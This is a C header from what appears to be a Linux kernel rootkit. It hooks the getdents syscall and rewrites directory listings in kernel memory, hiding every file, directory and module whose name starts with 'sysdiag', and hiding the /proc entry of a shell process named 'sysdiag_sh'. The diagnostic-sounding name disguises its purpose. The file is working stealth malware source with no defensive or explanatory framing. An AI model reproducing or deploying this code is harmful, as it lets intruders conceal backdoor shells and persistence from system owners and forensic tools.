#ifndef GETDENTS_H_
#define GETDENTS_H_

#include <linux/dirent.h>
#include <linux/pid.h>
/* 3.10 headers do not export struct linux_dirent (private to fs/readdir.c) */
struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

#define PREFIX "sysdiag"     /* hide anything starting with this        */
#define MARKER "sysdiag_sh"  /* comm of our shell (auto-hidden in /proc) */


static asmlinkage long (*og_getdents)(unsigned int fd,
        struct linux_dirent __user *dirent, unsigned int count);

static bool is_numeric(const char *s)
{
    int i;
    if (!s[0])
        return false;
    for (i = 0; s[i]; i++)
        if (s[i] < '0' || s[i] > '9')
            return false;
    return true;
}

/*
 * Shared filter for getdents and getdents64.
 * The original syscall already filled the user buffer with a list of
 * directory entries. We copy it in, "skip" unwanted entries by extending
 * the PREVIOUS entry's d_reclen over them (the entry is never copied
 * back, but the list stays valid), then copy the shrunk list out.
 *
 * Hides: (1) names starting with PREFIX  -> files, dirs, /sys/module/sysdiag
 *        (2) /proc/<pid> whose task comm == MARKER -> our shell process
 */
static long filter_dirents(void __user *udirent, long ret, bool is64)
{
    char *kbuf, *cur, *prev = NULL;
    unsigned long off = 0;

    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, udirent, ret)) {
        kfree(kbuf);
        return ret;
    }

    while (off < ret) {
        struct linux_dirent64 *d64;
        struct linux_dirent   *d32;
        char *name;
        unsigned short reclen;
        bool hide = false;

        cur = kbuf + off;

        if (is64) {
            d64    = (struct linux_dirent64 *)cur;
            name   = d64->d_name;
            reclen = d64->d_reclen;
        } else {
            d32    = (struct linux_dirent *)cur;
            name   = d32->d_name;
            reclen = d32->d_reclen;
        }

        if (strncmp(name, PREFIX, strlen(PREFIX)) == 0) {
            hide = true;                        /* rule 1: name prefix */
                } else if (is_numeric(name)) {          /* rule 2: /proc/<pid> */
            int pid;
            if (kstrtoint(name, 10, &pid) == 0) {
                struct pid *p = find_get_pid(pid);
                if (p) {
                    struct task_struct *t = get_pid_task(p, PIDTYPE_PID);
                    if (t) {
                        if (strncmp(t->comm, MARKER, strlen(MARKER)) == 0)
                            hide = true;
                        put_task_struct(t);
                    }
                    put_pid(p);
                }
            }
        }

        if (hide) {
            if (cur == kbuf) {
                /* first entry: slide whole list left over it, then
                 * re-examine the NEW first entry without advancing */
                ret -= reclen;
                memmove(cur, cur + reclen, ret);
                continue;
            }
            /* middle/last entry: stretch previous entry over this one */
            if (is64)
                ((struct linux_dirent64 *)prev)->d_reclen += reclen;
            else
                ((struct linux_dirent *)prev)->d_reclen += reclen;
        } else {
            prev = cur;   /* keep as anchor for the next hidden entry */
        }

        off += reclen;
    }

        if (copy_to_user(udirent, kbuf, ret))
        ret = -EFAULT;
    kfree(kbuf);
    return ret;
}

static asmlinkage long hooked_getdents(unsigned int fd,
        struct linux_dirent __user *dirent, unsigned int count)
{
    long ret = og_getdents(fd, dirent, count);
    if (ret <= 0)
        return ret;
    return filter_dirents(dirent, ret, false);
}

#endif